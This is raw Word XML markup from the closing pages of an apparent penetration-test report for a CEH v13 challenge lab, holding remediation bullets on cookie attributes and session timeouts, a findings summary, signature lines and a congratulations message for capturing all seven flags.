          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>R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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>m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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d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24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>on:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="6" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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ure,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Htt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pOnl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y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,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 xml:space="preserve"> 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meSi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e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kie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ttr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utes.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="15"/>
        <w:ind w:left="1800"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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Implem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nt s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ss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on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im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eo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ut a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P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/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u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se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2"/>
          <w:szCs w:val="22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-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g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ent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b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2"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>d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2"/>
          <w:szCs w:val="22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ng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f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or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2"/>
          <w:szCs w:val="22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ct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iv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 xml:space="preserve">e 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2"/>
          <w:szCs w:val="22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sio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2"/>
          <w:szCs w:val="22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2"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="2" w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pP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C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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>o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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>nc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lus</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>on</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="3" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="11"/>
          <w:szCs w:val="11"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="264" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="1204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his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gage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m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t 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u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cc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fully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de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m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on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tra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ed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m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ultip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l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 rea</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="3"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>l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-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w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orld vul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4"/>
          <w:szCs w:val="24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b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ili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ies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mm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only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f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ou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d in legacy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and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p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oorly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u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>r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ed internal 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viron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m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3"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24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. Findings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include cri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i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al flaws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in in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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>p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ut valid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t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="3"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24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on, in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ure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redential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4"/>
          <w:szCs w:val="24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orage,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ion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m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i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m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ana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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>g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m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t,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nd la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k of lateral mov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em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t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ontrol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.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We re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mm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d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p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riori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izi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g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re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m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edia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ion efforts bas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d on the ri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k rat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n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g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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>u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tlin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d in this re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p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ort,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nd</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="1080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404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ondu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ting</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>reg</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>u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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>lar inte</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>r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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nal a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ss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1"/>
          <w:position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-1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>sm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1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ts to val</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="3"/>
          <w:position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>da</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e defe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ns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spacing w:val="-1"/>
          <w:position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position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="700" w:right="0" w:bottom="280" w:left="0" w:header="0" w:footer="696" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="7200"/>
        </w:tabs>
        <w:spacing w:before="34" w:line="260" w:lineRule="exact"/>
        <w:ind w:left="1080" w:right="-56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A4634E"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:position w:val="-1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A4634E"/>
          <w:spacing w:val="-1"/>
          <w:position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A4634E"/>
          <w:position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">t </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-1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A4634E"/>
          <w:position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ine</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1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A4634E"/>
          <w:position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>r Signature:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="1"/>
          <w:position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A4634E"/>
          <w:position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single" w:color="A3634E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single" w:color="A3634E"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="3240"/>
        </w:tabs>
        <w:spacing w:before="34" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="600" w:right="0" w:bottom="280" w:left="0" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:num="2" w:space="720" w:equalWidth="0">
            <w:col w:w="7216" w:space="120"/>
            <w:col w:w="4904"/>
          </w:cols>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:br w:type="column"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Date: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single" w:color="A3634E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single" w:color="A3634E"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="280" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="600" w:right="0" w:bottom="280" w:left="0" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="7180"/>
        </w:tabs>
        <w:spacing w:before="34"/>
        <w:ind w:left="1080" w:right="-56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lastRenderedPageBreak/>
        <w:t>Client Signature</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="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  <w:u w:val="single" w:color="A3634E"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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  <w:u w:val="single" w:color="A3634E"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="3220"/>
        </w:tabs>
        <w:spacing w:before="34"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="600" w:right="0" w:bottom="280" w:left="0" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:num="2" w:space="720" w:equalWidth="0">
            <w:col w:w="7194" w:space="120"/>
            <w:col w:w="4926"/>
          </w:cols>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:br w:type="column"/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</w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Date: 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  <w:u w:val="single" w:color="A3634E"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single" w:color="A3634E"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="15"/>
          <w:szCs w:val="15"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>Co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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>gratulati</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>s!</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="6" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="264" w:lineRule="auto"/>
        <w:ind w:left="1440" w:right="1391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Well done! You have c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4"/>
          <w:szCs w:val="24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mp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leted the C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Hv13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Challenge La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b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. You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'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ve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u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ncovered vuln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ra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b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ili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ie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, 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ala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ed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p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rivilege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, a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n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d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p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ivo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ed through the n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twork like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a true ethi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pacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24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l ha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ker.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="11"/>
          <w:szCs w:val="11"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="264" w:lineRule="auto"/>
        <w:ind w:left="1440" w:right="1302"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:eastAsia="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji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You captured all 7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flags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 xml:space="preserve"> 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and turned in an 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tionable re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p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ort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o the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lient. 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A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ll on ti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m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e and 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u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 xml:space="preserve">nder budget </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:eastAsia="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:color w:val="404040"/>
          <w:w w:val="106"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>😉</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="10" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="11"/>
          <w:szCs w:val="11"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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Mi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ss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ion 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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>cc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o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mp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lis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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ed!</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="6" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="007E35E5">
      <w:pPr>
        <w:ind w:left="1080"/>
        <w:sectPr w:rsidR="00CF78E9">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="700" w:right="0" w:bottom="280" w:left="0" w:header="0" w:footer="696" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:pict>
          <v:shape id="_x0000_i1032" type="#_x0000_t75" style="width:111.75pt;height:105.75pt">
            <v:imagedata r:id="rId44" o:title=""/>
          </v:shape>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="007E35E5">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:pict>
